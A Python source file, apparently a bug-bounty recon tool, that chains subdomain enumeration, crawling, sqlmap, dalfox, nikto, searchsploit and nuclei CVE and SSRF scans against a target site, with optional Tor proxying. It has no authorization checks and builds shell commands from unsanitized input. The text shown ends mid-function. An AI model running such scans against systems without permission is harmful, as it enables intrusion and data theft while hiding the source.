from datetime import datetime
import subprocess
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
from urllib.parse import  unquote
import argments
import re
import os
import json
import socket
from termcolor import colored
import google.generativeai as genai
import concurrent.futures
options=argments.setarguments()
import requests
########################################
#########     SUBDUMAIN #########
def subfinder(website, place,use_tor=False):
    print(colored(f"[+] subfinder Start: {website}", "cyan"))
    proxy_flag = get_proxy_config("subfinder", use_tor)
    if options.api:
        command = f"subfinder -d {website} -all -provider-config {place}/my_configsa/subfinder_config.yaml > {place}/subfinderOutput.txt {proxy_flag}"
    else:
        command = f"subfinder -d {website} -all  > {place}/subfinderOutput.txt"
    try:

        subprocess.run(command,capture_output=True,text=True,timeout=120, shell=True)
        with open(place+"/subfinderOutput.txt", "r", encoding="utf-8") as f:
            result = [amassf.strip() for amassf in f]
        return "the subfinder found: "+str(len(result))
    except subprocess.TimeoutExpired:
        print(colored("subfinder timed out",'red'))
def amass(website, place):
    try:
        print(colored(f"[+] amass: {website}", "cyan"))
        if options.api:
            command = f"amass enum -passive -d {website} -config {place}/my_configs/amass_config.yaml > {place}/amassOutput.txt"
        else:
            command = f"amass enum -passive -d {website}  > {place}/amassOutput.txt"
        subprocess.run(command,capture_output=True,text=True,timeout=320, shell=True)
        with open(place+"/amassOutput.txt", "r", encoding="utf-8") as f:
             result = [amassf.strip() for amassf in f]
        return "the amass found: "+str(len(result))

    except subprocess.TimeoutExpired:
        with open(place + "/amassOutput.txt", "r", encoding="utf-8") as f:
            result = [amassf.strip() for amassf in f]
        print(colored("amass timed out",'red'))
        return "the amass found: "+str(len(result))
def assetfinder(website, place):
    try:
        print(colored(f"[+] assetfinder: {website}", "cyan"))

        subprocess.run("assetfinder --subs-only "+website+" > "+place+"/assetFOutput.txt",capture_output=True,text=True,timeout=120, shell=True)
        with open(place+"/assetFOutput.txt", "r", encoding="utf-8") as f:
            result = [amassf.strip() for amassf in f]
        return "the assetfinder found: "+str(len(result))
    except subprocess.TimeoutExpired:
        print(colored("assetfinder timed out",'red'))
def subdumainEnum(website, place):
    cleenLink=clean_text(website,["https://www.","http://www.","www.","https","http","//",":"])
    subfinder(cleenLink, place)
    assetfinder(cleenLink, place)
    amass(cleenLink, place)
    merge_and_clean(website,place)
def merge_and_clean(website,path):
    try:
        print(colored("[+] Merging files and removing duplicates...","cyan"))
        command = f"sort -u {path}/subfinderOutput.txt {path}/assetFOutput.txt {path}/amassOutput.txt > {path}/finalSubs.txt"
        subprocess.run(command, shell=True)
        commandT=f"sed -i '1i {website}' {path}/finalSubs.txt"
        subprocess.run(commandT, shell=True)
        print(colored("[+] Done! Saved in finalsubs.txt","cyan"))
    except Exception as e:
        print(colored("[-] Error occured while merging files",'red'))
        commandT = f"sed -i '1i {website}' {path}/finalSubs.txt"
        subprocess.run(commandT, shell=True)
def clean_text(text, unwanted_words):

    for word in unwanted_words:
        text = text.replace(word, "")
    return text
########################################
#########  CRAWLING  #########
def katana(website, place):
    try:

        if not website.startswith(("http://", "https://")):
            url = "https://" + website
        else:
            url = website


        output_path = f"{place}/katana_urls.txt"
        command = f"katana -u {url} -silent -jc -kf -c 10 >> {output_path}"

        print(colored(f"[*] Running Katana on {url}...", "cyan"))


        subprocess.run(command, shell=True, timeout=300, check=True)

    except subprocess.TimeoutExpired:
        print(colored("[-] Katana timed out (took too long to crawl JS).", 'red'))
    except subprocess.CalledProcessError as e:
        print(colored(f"[-] Katana Error: {e}", 'red'))
def combine(link, place):
    try:
        crawlig(link, place)
        katana(link, place)

    except subprocess.TimeoutExpired:
        print("error")
def crawlig(website, place):
    try:
        if not website.startswith(("http://", "https://")):
            url = "https://" + website
        else:
            url = website
        subprocess.run("echo "+url+" | "+"hakrawler  "+" >> "+place+"/hackrwlerurls.txt" ,capture_output=True,text=True,timeout=120, shell=True)
    except subprocess.TimeoutExpired:
        print(colored("hakrawler timed out",'red'))
def deepCrawl(website, place):
    try:
        print(colored(f"[+] Crawling: {website}", "cyan"))
        crawlig(website, place)

        with open(place + "/finalSubs.txt", "r") as file:
            links = file.readlines()
        for link in links:
            link = link.strip()
            if link:
                combine(link, place)
        try:
            print(colored("[+] Merging files and removing duplicates...", "cyan"))
            command = f"sort -u {place}/hackrwlerurls.txt {place}/katana_urls.txt > {place}/finalRawlers.txt"
            subprocess.run(command, shell=True)

            print(colored("[+] Done! Saved in finalRawlers.txt", "cyan"))
        except Exception as e:
            print(colored("[-] Error occured while merging files", 'red'))
        extract_parameter_urls(place)
    except Exception as e:
        print(colored("[-] Error occured while crawlingDeep", 'red'))
        extract_parameter_urls(place)
########################################
#########     EXTRACT AND DOWNLOAD  #########
def extract_parameter_urls(place):
    input_file = os.path.join(place, "finalRawlers.txt")
    output_file = os.path.join(place, "Parameters.txt")

    print(colored(f"[+] Filtering & Deduplicating URLs with parameters from {input_file}...", "blue"))

    ignored_extensions = (".jpg", ".jpeg", ".png", ".gif", ".css", ".js", ".svg", ".woff", ".ico")

    unique_urls = []  # Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
    seen_signatures = set()  # Ù„ØªØ®Ø²ÙŠÙ† "Ø¨ØµÙ…Ø©" Ø§Ù„Ø±Ø§Ø¨Ø· Ù„Ù…Ù†Ø¹ Ø§Ù„ØªÙƒØ±Ø§Ø±

    count = 0
    try:
        # 1. Ø§Ù„Ù‚Ø±Ø§Ø¡Ø© ÙˆØ§Ù„ÙÙ„ØªØ±Ø© ÙÙŠ Ø§Ù„Ø°Ø§ÙƒØ±Ø©
        if os.path.exists(input_file):
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f_in:
                for line in f_in:
                    url = line.strip()

                    # Ø§Ù„Ø´Ø±Ø· Ø§Ù„Ø£ÙˆÙ„: ÙˆØ¬ÙˆØ¯ Ø¨Ø§Ø±Ø§Ù…ÙŠØªØ±Ø§Øª
                    if "?" in url and "=" in url:
                        # Ø§Ù„Ø´Ø±Ø· Ø§Ù„Ø«Ø§Ù†ÙŠ: Ø§Ù„Ø§Ù…ØªØ¯Ø§Ø¯Ø§Øª
                        if not url.lower().endswith(ignored_extensions):

                            # === Ø§Ù„Ù„ÙˆØ¬ÙŠÙƒ Ø§Ù„Ø°ÙƒÙŠ (Smart Deduplication) ===
                            try:
                                parsed = urlparse(url)
                                # Ø¨Ù†Ø¬ÙŠØ¨ Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ø¨Ø§Ø±Ø§Ù…ÙŠØªØ±Ø§Øª (keys) ÙÙ‚Ø· Ù…Ù† ØºÙŠØ± Ø§Ù„Ù‚ÙŠÙ…
                                query_params = parse_qs(parsed.query)
                                param_keys = tuple(sorted(query_params.keys()))

                                # Ø§Ù„Ø¨ØµÙ…Ø© = Ø§Ù„Ø¯ÙˆÙ…ÙŠÙ† + Ø§Ù„Ù…Ø³Ø§Ø± + Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ø¨Ø§Ø±Ø§Ù…ÙŠØªØ±Ø§Øª
                                # Ø£ÙŠ Ø±Ø§Ø¨Ø· Ù„ÙŠÙ‡ Ù†ÙØ³ Ø§Ù„Ø¨ØµÙ…Ø© Ø¯ÙŠ Ù‡ÙŠØ¹ØªØ¨Ø± ØªÙƒØ±Ø§Ø± ÙˆÙ…Ø´ Ù‡ÙŠØªØ­ÙØ¸
                                signature = (parsed.netloc, parsed.path, param_keys)

                                if signature not in seen_signatures:
                                    seen_signatures.add(signature)
                                    unique_urls.append(url)
                                    count += 1
                            except Exception:
                                # Ù„Ùˆ Ø­ØµÙ„ Ø§ÙŠØ±ÙˆØ± ÙÙŠ ØªØ­Ù„ÙŠÙ„ Ø±Ø§Ø¨Ø· Ù…Ø¹ÙŠÙ†ØŒ Ø¹Ø¯Ù‡ ÙˆÙ…ØªÙ‚ÙØ´
                                pass

            # 2. Ø­ÙØ¸ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù†Ø¸ÙŠÙØ© ÙÙŠ Ø§Ù„Ù…Ù„Ù
            # Ø§Ø³ØªØ®Ø¯Ù…Ù†Ø§ 'w' Ø¹Ø´Ø§Ù† ÙŠÙƒØªØ¨ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©ØŒ Ù„Ùˆ Ø¹Ø§ÙˆØ² 'a' ØºÙŠØ±Ù‡Ø§
            with open(output_file, 'w', encoding='utf-8') as f_out:
                for unique_url in unique_urls:
                    f_out.write(unique_url + "\n")

            print(colored(f"[+] Done! Found {count} UNIQUE parameter URLs. Saved to {output_file}", "cyan"))

            # ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª
            subprocess.run(f"chmod -R 777 {output_file}", shell=True)

        else:
            print(colored(f"[-] Error: File {input_file} not found!", "red"))

    except Exception as e:
        print(colored(f"[-] Critical Error in filtering: {e}", "red"))
def extract_files_urls(place,type):
    input_file=place+f"/finalRawlers.txt"
    output_file=place+f"/{type}.txt"
    print(f"[+] Filtering URLs with {type} from {input_file}...")
    ignored_extensions = (".jpg", ".jpeg", ".png", ".gif", ".css", ".svg")
    count = 0
    try:
        with open(input_file, 'r') as f_in, open(output_file, 'w') as f_out:
            for line in f_in:
                url = line.strip()
                if f".{type}" in url :
                    if not url.lower().endswith(ignored_extensions) and not url.lower().endswith(f".{type}"):
                        f_out.write(url + "\n")
                        count += 1
        print(colored(f"[+] Done! Found {count} {type} URLs. Saved to {output_file}","cyan") )

    except FileNotFoundError:
        print(colored(f"[-] Error: File {input_file} not found!","red") )
def extract_links(file_path,type):
    links = set()

    with open(file_path+f"/{type}.txt", "r", encoding="utf-8", errors="ignore") as file:
        for line in file:
            line = line.strip()

            if re.search(f"\.{type}(\?|$)", line.lower()):
                links.add(line)

    return links
def downloadFiles(php_links,place,type):
    download_dir = os.path.join(place, f"{type}_files")
    os.makedirs(download_dir, exist_ok=True)
    print(colored(f"[+] Downloading {len(php_links)} files into: {download_dir}","yellow", attrs=["bold"]))
    for url in php_links:
        try:
            print(colored(f"   â””â”€â”€ Downloading: {url}","cyan"))

            command = [
                "wget",
                "-q",
                "-P", download_dir,
                "--no-check-certificate",
                "--content-disposition",
                url
            ]

            subprocess.run(command, check=True)

        except Exception as e:
            print(colored(f"[-] Error downloading {url}: {e}","red"))
    try:

        subprocess.run(f"chmod -R 777 {download_dir}", shell=True)
        print(colored(f"[+]You can now edit files in: {download_dir}","yellow", attrs=["bold"]))
    except Exception as e:
        print(colored(f"[-] Failed to fix permissions: {e}",color="red"))
def download(place,type):
    extract_files_urls(place,type)
    lick=extract_links(place, type)
    downloadFiles(lick,place,type)
def downloadImportant(place):
    download(place,"js")
    download(place, "php")
    download(place, "html")
########################################
############   SQLI   ################
def scan_sqli(url, place,use_tor=False):
    print(colored(f"[+] Scanning for SQLi: {url}", "cyan"))
    proxy_flag = get_proxy_config("sqlmap", use_tor)
    command = f"sqlmap -u '{url}' --batch --level 1 --risk 1 --dbs {proxy_flag}"
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output_lines = result.stdout.splitlines()
        injections = []
        current_type = "Unknown"
        for line in output_lines:
            line = line.strip()
            if line.startswith("Type:"):
                current_type = line.split("Type:")[1].strip()

            elif line.startswith("Payload:"):
                payload = line.split("Payload:")[1].strip()
                injections.append({"type": current_type, "payload": payload})

        # Ø§Ù„Ø´Ø±Ø·: Ù„Ùˆ Ù„Ù‚ÙŠÙ†Ø§ Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² Ø£Ùˆ ÙƒÙ„Ù…Ø© available databases
        if injections or "available databases" in result.stdout:
            print(colored(f"[!!!] VULNERABLE TO SQLi: {url}", "green", attrs=['bold']))

            # Ø­ÙØ¸ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø¨ØªÙ†Ø³ÙŠÙ‚ Ù…Ø±ØªØ¨
            with open(place + "/vulnerable_sqli.txt", "a") as f:
                f.write(f"Target: {url}\n")

                if injections:
                    f.write("Payloads Found:\n")
                    for inj in injections:
                        f.write(f"  [*] Type: {inj['type']}\n")
                        f.write(f"  [*] Payload: {inj['payload']}\n")
                        f.write("-" * 30 + "\n")
                else:
                    f.write("  [*] Vulnerable (Databases extracted but no specific payload captured in parsing)\n")

                f.write("=" * 60 + "\n\n")
        else:
            print(colored(f"[-] Not Vulnerable {url}", "red"))

    except Exception as e:
        print(colored(f"Error SQLI {url}: {e}", "red"))
def SQLI( place,use_tor=False):
    try:
        with open(place + "/Parameters.txt", "r") as file:
            links = file.readlines()
        for link in links:
            link = link.strip()
            if link:
                scan_sqli(link, place,use_tor)
    except Exception as e:
        print(colored("[-] Error occured while scanning", 'red'))
########################################
############   XSS   ################
def scan_xss(url, place,use_tor=False):
    print(colored(f"[+] Scanning for XSS: {url}","cyan"))
    proxy_flag = get_proxy_config("dalfox", use_tor)
    # --no-color: Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹ Ø¹Ø´Ø§Ù† Ø§Ù„Ù†ØµÙˆØµ ØªØªØ®Ø²Ù† Ù†Ø¸ÙŠÙØ© Ù…Ù† ØºÙŠØ± Ø±Ù…ÙˆØ² Ø§Ù„Ø£Ù„ÙˆØ§Ù†
    command = f"dalfox url '{url}' --no-color {proxy_flag}"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Ù†Ù‚Ø³Ù… Ø§Ù„Ù…Ø®Ø±Ø¬Ø§Øª Ù„Ø³Ø·ÙˆØ± Ø¹Ø´Ø§Ù† Ù†ÙØ­Øµ ÙƒÙ„ Ø³Ø·Ø± Ù„ÙˆØ­Ø¯Ù‡
        output_lines = result.stdout.splitlines()

        found_vulnerability = False
        captured_pocs = []

        for line in output_lines:
            # Dalfox Ø¨ÙŠØ­Ø· Ø§Ù„Ù„ÙŠÙ†Ùƒ Ø§Ù„Ù…ØµØ§Ø¨ ÙˆØ§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯ Ø¬Ù†Ø¨ ÙƒÙ„Ù…Ø© [POC]
            if "[POC]" in line:
                found_vulnerability = True
                # ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø³Ø·Ø± ÙˆÙ…Ø³Ø­ Ø§Ù„Ù…Ø³Ø§ÙØ§Øª Ø§Ù„Ø²Ø§ÙŠØ¯Ø©
                poc_line = line.replace("[POC]", "").strip()
                captured_pocs.append(poc_line)

        # Ù„Ùˆ Ù„Ù‚ÙŠÙ†Ø§ Ø«ØºØ±Ø§ØªØŒ Ù†ÙØªØ­ Ø§Ù„Ù…Ù„Ù ÙˆÙ†ÙƒØªØ¨ Ø§Ù„ØªÙØ§ØµÙŠÙ„
        if found_vulnerability:
            print(colored(f"[!!!] VULNERABLE TO XSS: {url}","green" ,attrs=['bold']))
            with open(place + "/vulnerable_xss.txt", "a") as f:
                f.write(f"Target: {url}\n")
                f.write(f"Status: Vulnerable\n")
                f.write("Payloads / POCs found:\n")
                for poc in captured_pocs:
                    f.write(f" -> {poc}\n")
                f.write("-" * 50 + "\n")

    except Exception as e:
        print(f"Error scanning {url}: {e}")
def XSS( place,use_tor=False):
    try:
        with open(place + "/Parameters.txt", "r") as file:
            links = file.readlines()
        for link in links:
            link = link.strip()
            if link:
                scan_xss(link, place,use_tor)
    except Exception as e:
        print(colored("[-] Error occured while XSS", 'red'))
########################################
############   INFODIS AND CMS   ################
def scan_info_disclosure_nikto(url, place):
    print(colored(f"[+] Scanning for Info Disclosure using Nikto: {url}", "cyan"))



    command = f"nikto -h '{url}' -maxtime 2m -nointeractive"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        output_lines = result.stdout.splitlines()
        found_info = []

        for line in output_lines:
            if line.startswith("+"):
                clean_line = line.replace("+ ", "").strip()
                found_info.append(clean_line)

        if found_info:
            print(colored(f"[!!!] Info Disclosure Found: {url}", "yellow"))

            with open(place + "/info_disclosure_nikto.txt", "a") as f:
                f.write("=" * 60 + "\n")
                f.write(f"Target: {url}\n")
                f.write("Nikto Findings:\n")

                for info in found_info:
                    f.write(f"  [!] {info}\n")

                f.write("=" * 60 + "\n\n")
        else:
            print(colored(f"[-] No critical info found by Nikto for {url}", "white"))

    except Exception as e:
        print(colored(f"Error Nikto Scan {url}: {e}", "red"))
def scan_cms(url, place):
    print(colored(f"[+] Fingerprinting CMS for: {url}", "cyan"))

    # --color=never: Ø¹Ø´Ø§Ù† Ø§Ù„Ù…Ø®Ø±Ø¬Ø§Øª ØªÙƒÙˆÙ† Ù†Øµ ØµØ§ÙÙŠ ÙˆÙ†Ø¹Ø±Ù Ù†Ø¹Ù…Ù„Ù‡Ø§ parsing
    # -v: verbose Ø¹Ø´Ø§Ù† ÙŠØ¬ÙŠØ¨ ØªÙØ§ØµÙŠÙ„ Ø£ÙƒØªØ±
    command = f"whatweb '{url}' --color=never -v"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Ù‡Ù†Ø­Ø§ÙˆÙ„ Ù†Ø³ØªØ®Ø±Ø¬ Ø£Ù‡Ù… Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨Ø³ Ø¹Ø´Ø§Ù† Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ù…ÙŠØ¨Ù‚Ø§Ø´ Ø²Ø­Ù…Ø©
        output = result.stdout
        cms_info = []

        # Regex ÙŠØ¯ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙŠ Ø­Ø§Ø¬Ø© ÙÙŠÙ‡Ø§ ÙƒÙ„Ù…Ø© CMS Ø£Ùˆ Ø¥ØµØ¯Ø§Ø±Ø§Øª
        # WhatWeb Ø¨ÙŠÙƒØªØ¨ Ø§Ù„Ù†ØªØ§ÙŠØ¬ Ø¨ÙˆØ¶ÙˆØ­ØŒ Ø§Ø­Ù†Ø§ Ù‡Ù†Ø§Ø®Ø¯ Ø§Ù„Ø³Ø·Ø± Ø§Ù„Ù„ÙŠ ÙÙŠÙ‡ "Summary" Ø£Ùˆ Plugins

        # Ø·Ø±ÙŠÙ‚Ø© Ø¨Ø³ÙŠØ·Ø©: Ø­ÙØ¸ Ø§Ù„ØªÙ‚Ø±ÙŠØ± ÙƒÙ…Ø§ Ù‡Ùˆ Ù„ÙƒÙ† Ù…Ù†Ø¸Ù…
        if output:
            print(colored(f"[+] CMS Info Found for: {url}", "green"))

            with open(place + "/cms_results.txt", "a") as f:

                f.write(f"Target: {url}\n")
                f.write("Details:\n")

                # ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ù…Ø®Ø±Ø¬Ø§Øª: Ù†Ø§Ø®Ø¯ Ø§Ù„Ø³Ø·ÙˆØ± Ø§Ù„Ù…Ù‡Ù…Ø© Ø¨Ø³
                for line in output.splitlines():
                    line = line.strip()
                    # WhatWeb Ø¨ÙŠØ±Ø¬Ø¹ Ø³Ø·ÙˆØ± ÙƒØªÙŠØ±ØŒ Ø§Ø­Ù†Ø§ Ø¹Ø§ÙˆØ²ÙŠÙ† Ø§Ù„Ù„ÙŠ ÙÙŠÙ‡Ø§ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
                    if line and not line.startswith("http"):
                        f.write(f"  {line}\n")

                f.write("=" * 60 + "\n\n")
        else:
            print(colored(f"[-] No CMS info found for {url}", "yellow"))

    except Exception as e:
        print(colored(f"Error CMS Scan {url}: {e}", "red"))
########################################
############   GET LENGTH AND SUMRIZE   ################
def get_file_length(filename):
    try:
        with open(filename, 'r') as f:
            # Ø¯Ø§Ù„Ø© sum Ø¯ÙŠ Ø³Ø±ÙŠØ¹Ø© Ø¬Ø¯Ø§Ù‹ ÙˆØ¨ØªØ¹Ø¯ Ø§Ù„Ø³Ø·ÙˆØ± Ø§Ù„Ù„ÙŠ ÙÙŠÙ‡Ø§ ÙƒÙ„Ø§Ù… Ø¨Ø³ (Ø¹Ø´Ø§Ù† Ù„Ùˆ ÙÙŠÙ‡ Ø³Ø·ÙˆØ± ÙØ§Ø¶ÙŠØ© Ù…ØªØªØ­Ø³Ø¨Ø´)
            count = sum(1 for line in f if line.strip())
        return count
    except FileNotFoundError:
        return 0  # Ù„Ùˆ Ø§Ù„Ù…Ù„Ù Ù…Ø´ Ù…ÙˆØ¬ÙˆØ¯ Ù†Ø±Ø¬Ø¹ ØµÙØ±
    except Exception as e:
        print(f"Error reading {filename}: {e}")
        return 0
def count_vulnerabilities(filename):
    count = 0
    try:
        with open(filename, 'r') as f:
            for line in f:
                # Ø¨Ù†Ø¹Ø¯ Ø§Ù„Ù…Ø±Ø§Øª Ø§Ù„Ù„ÙŠ ÙƒÙ„Ù…Ø© Target Ø¸Ù‡Ø±Øª ÙÙŠÙ‡Ø§ ÙÙŠ Ø¨Ø¯Ø§ÙŠØ© Ø§Ù„Ø³Ø·Ø±
                if line.strip().startswith("Target:") or line.strip().startswith("[VULN CHECK]") or line.strip().startswith("[System File Access"):
                    count += 1
        return count
    except FileNotFoundError:
        return 0  # Ù„Ùˆ Ø§Ù„Ù…Ù„Ù Ù…Ø´ Ù…ÙˆØ¬ÙˆØ¯ (ÙŠØ¹Ù†ÙŠ Ù…ÙÙŠØ´ Ø«ØºØ±Ø§Øª Ù„Ø³Ù‡)
def SumrizeTxt(website,place):
    try:
        try:
            amass = get_file_length(place + "/amassOutput.txt")
        except Exception as e:
            print(colored(f"[-] Error amaas Sumrizing: {e}", "red"))
        try:
            assetfinder = get_file_length(place + "/assetFOutput.txt")
        except Exception as e:
            print(colored(f"[-] Error assetFinder: {e}", "red"))
        try:
            subfinder = get_file_length(place + "/subfinderOutput.txt")
        except Exception as e:
            print(colored(f"[-] Error subfinder: {e}", "red"))
        try:
            totalSubs = get_file_length(place + "/finalSubs.txt")
        except Exception as e:
            print(colored(f"[-] Error totalSubs: {e}", "red"))
        try:
            TotalParams = get_file_length(place + "/Parameters.txt")
        except Exception as e:
            print(colored(f"[-] Error TotalParams: {e}", "red"))
        try:
            sqli = count_vulnerabilities(place + "/vulnerable_sqli.txt")
        except Exception as e:
            print(colored(f"[-] Error sqli: {e}", "red"))
        try:
            xss = count_vulnerabilities(place + "/vulnerable_xss.txt")
        except Exception as e:
            print(colored(f"[-] Error xss: {e}", "red"))
        php = get_file_length(place + "/php.txt")
        try:
            js = get_file_length(place + "/js.txt")
        except Exception as e:
            print(colored(f"[-] js: {e}", "red"))
        try:
            json=get_file_length(place + "/json.txt")
        except Exception as e:
            print(colored(f"[-] json: {e}", "red"))
        try:
            html = get_file_length(place + "/html.txt")
        except Exception as e:
            print(colored(f"[-] html: {e}", "red"))
        try:
            cve = count_vulnerabilities(place + "/cve_exploits.txt")
        except Exception as e:
            print(colored(f"[-] cve: {e}", "red"))
        try:
            SSRF=get_file_length(place + "/ssrf.txt")
        except Exception as e:
            print(colored(f"[-] SSRF: {e}", "red"))
        try:
            lfi=get_file_length(place + "/lfi.txt")+get_file_length(place + "/lfi_results.txt")
        except Exception as e:
            print(colored(f"[-] lfi: {e}", "red"))
        try:
            cves=get_file_length(place + "/cve_nuclei_active.txt")
        except Exception as e:
            print(colored(f"[-] cves: {e}", "red"))

        return f"""
     Welcome to RecTool!
Your website is {website}
       Subdomains
amass: {amass}
assetfinder: {assetfinder}
subfinder: {subfinder}
total Uniqe Subs: {totalSubs}
_____________________________
       Params & Fils
parameters: {TotalParams}
php: {php}
JS: {js}
HTML page: {html}
json: {json}
_____________________________
       vulnerabilty
 vulnerable XSS: {xss}
 vulnerable Sqli: {sqli}
 vulnerable lfi: {lfi}
 vulnerable ssrf: {SSRF}
____________________________
           CVEs
 CVE: {cve}
 CVE_Active: {cves}
"""
    except Exception as e:
        print(colored("[-] Error occured while Make Masege", 'red'))
######################################
########     CVE  Detector   ########
def clean_version(raw_version):
    # ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ù„Ù†Øµ
    if isinstance(raw_version, list):
        if len(raw_version) > 0:
            ver_str = str(raw_version[0])
        else:
            return ""
    else:
        ver_str = str(raw_version)

    match = re.search(r'([0-9]+\.[0-9]+(\.[0-9]+)?)', ver_str)

    if match:
        return match.group(1)
    return ver_str
def check_exploits_searchsploit(product_name, version, place):

    if version:
        query = f"{product_name} {version}"
        print(colored(f"       [*] Searching Exploits for: {query}...", "cyan"))
    else:
        query = f"{product_name}"
        print(colored(f"       [*] Searching Generic Exploits for: {query}...", "yellow"))

    command = f"searchsploit '{query}' --json"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        try:
            data = json.loads(result.stdout)
            exploits = data.get('RESULTS_EXPLOIT', [])

            if exploits:
                print(colored(f"       [!] FOUND {len(exploits)} Exploits/CVEs!", "red", attrs=['bold']))

                report_file = os.path.join(place, "cve_exploits.txt")
                with open(report_file, "a") as f:
                    f.write(f"\n{'=' * 50}\n")
                    f.write(f"[VULN CHECK] Target: {query}\n")
                    f.write(f"{'=' * 50}\n")

                    for ex in exploits[:5]:
                        title = ex.get('Title', 'No Title')
                        edb_id = ex.get('EDB-ID', 'N/A')

                        print(colored(f"       â””â”€â”€ [EDB-{edb_id}] {title[:60]}...", "yellow"))

                        f.write(f"ID: {edb_id}\nTitle: {title}\nLink: https://www.exploit-db.com/exploits/{edb_id}\n")
                        f.write("-" * 30 + "\n")
            else:
                print(colored("       [-] No exploits found in local DB.", "green"))

        except json.JSONDecodeError:
            print(colored("       [-] No results.", "white"))

    except Exception as e:
        print(colored(f"       [-] Error running searchsploit: {e}", "red"))
def scan_cve_nuclei(place, use_tor=False):
    targets_file = f"{place}/finalSubs.txt"
    output_file = f"{place}/cve_nuclei_active.txt"

    print(colored(f"\n[+] Starting Active CVE Scan using Nuclei (Real Exploitation)...", "cyan"))

    if not os.path.exists(targets_file):
        print(colored("[-] No targets file found for Nuclei.", "red"))
        return

    proxy_flag = ""
    if use_tor:
        proxy_flag = " -proxy socks5://127.0.0.1:9050"


    command = f"nuclei -l {targets_file} -tags cves -severity critical,high,medium {proxy_flag} -o {output_file} -silent"

    try:

        subprocess.run(command, shell=True, timeout=900)

        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(colored(f"   [!!!] CONFIRMED CVEs FOUND BY NUCLEI!", "red", attrs=['bold']))
            print(colored(f"   Check report: {output_file}", "yellow"))

            with open(output_file, 'r') as f:
                print("   Active Findings:")
                for i, line in enumerate(f):
                    if i < 3:
                        print(colored(f"   â””â”€â”€ {line.strip()}", "red"))
                    else:
                        break
        else:
            print(colored("   [-] No active CVEs detected by Nuclei.", "green"))

    except subprocess.TimeoutExpired:
        print(colored("   [-] Nuclei CVE Scan Timed out (Skipping).", "white"))
    except Exception as e:
        print(colored(f"   [-] Error: {e}", "red"))
def scan_cve_full(url, place):
    print(colored(f"\n[+] Starting Advanced CMS & Vulnerability Analysis: {url}", "blue", attrs=['bold']))

    json_file = os.path.join(place, "whatweb_temp.json")

    command = f"whatweb {url} --log-json {json_file} --color=never"

    try:
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if os.path.exists(json_file):
            with open(json_file, 'r') as f:
                try:
                    data = json.load(f)
                    if not data:
                        print(colored("[-] WhatWeb returned no data.", "yellow"))
                        return

                    plugins = data[0].get('plugins', {})
                    print(colored("[+] Technologies Detected:", "green"))

                    important_techs = [
                        'WordPress', 'Apache', 'nginx', 'PHP', 'Joomla',
                        'Drupal', 'Microsoft-IIS', 'Tomcat', 'Python', 'OpenSSL'
                    ]

                    for name, info in plugins.items():
                        raw_version = info.get('version', '')

                        clean_ver = clean_version(raw_version)

                        display_ver = clean_ver if clean_ver else "Unknown"
                        print(f"   â””â”€â”€ {name} : {display_ver}")

                        if name in important_techs:
                            check_exploits_searchsploit(name, clean_ver, place)

                except json.JSONDecodeError:
                    pass
        else:
            print(colored("[-] WhatWeb output file not found.", "red"))

    except Exception as e:
        print(colored(f"[-] Error in CVE Module: {e}", "red"))
######################################
########     proxy  support   ########
def is_tor_running():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('127.0.0.1', 9050)) == 0
def get_proxy_config(tool_name, use_tor):

    if not use_tor:
        if tool_name == "requests": return None
        return ""

    tor_proxy = "socks5://127.0.0.1:9050"

    if tool_name == "sqlmap":
        return f" --proxy={tor_proxy} --check-tor"

    elif tool_name == "dalfox":
        return f" --proxy {tor_proxy}"

    elif tool_name == "whatweb":
        return f" --proxy {tor_proxy} --proxy-type socks5"

    elif tool_name == "subfinder":
        return f" -proxy {tor_proxy}"

    return ""
#######################################
#############    SSRF     #############
def scan_ssrf_mass(place, use_tor=False):
    targets_file = f"{place}/Parameters.txt"
    output_file = f"{place}/ssrf.txt"

    print(colored(f"\n[+] Starting Massive SSRF Scan on all targets...", "magenta"))

    if not os.path.exists(targets_file):
        print(colored("[-] No targets file found to scan.", "red"))
        return

    # Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø¨Ø±ÙˆÙƒØ³ÙŠ
    proxy_flag = ""
    if use_tor:
        proxy_flag = " -proxy socks5://127.0.0.1:9050"

    # Ø§Ù„Ø£Ù…Ø± Ø§Ù„Ø³Ø­Ø±ÙŠ:
    # -l: Ø¨Ù†Ø­Ø¯Ø¯Ù„Ù‡ Ù„ÙŠØ³ØªØ© (ÙØ§ÙŠÙ„) Ø¨Ø¯Ù„ Ø±Ø§Ø¨Ø· ÙˆØ§Ø­Ø¯ (-u)
    # -tags ssrf: Ø¯ÙˆØ± Ø¹Ù„Ù‰ ssrf Ø¨Ø³
    command = f"nuclei -l {targets_file} -tags ssrf {proxy_flag} -o {output_file} -silent"

    try:
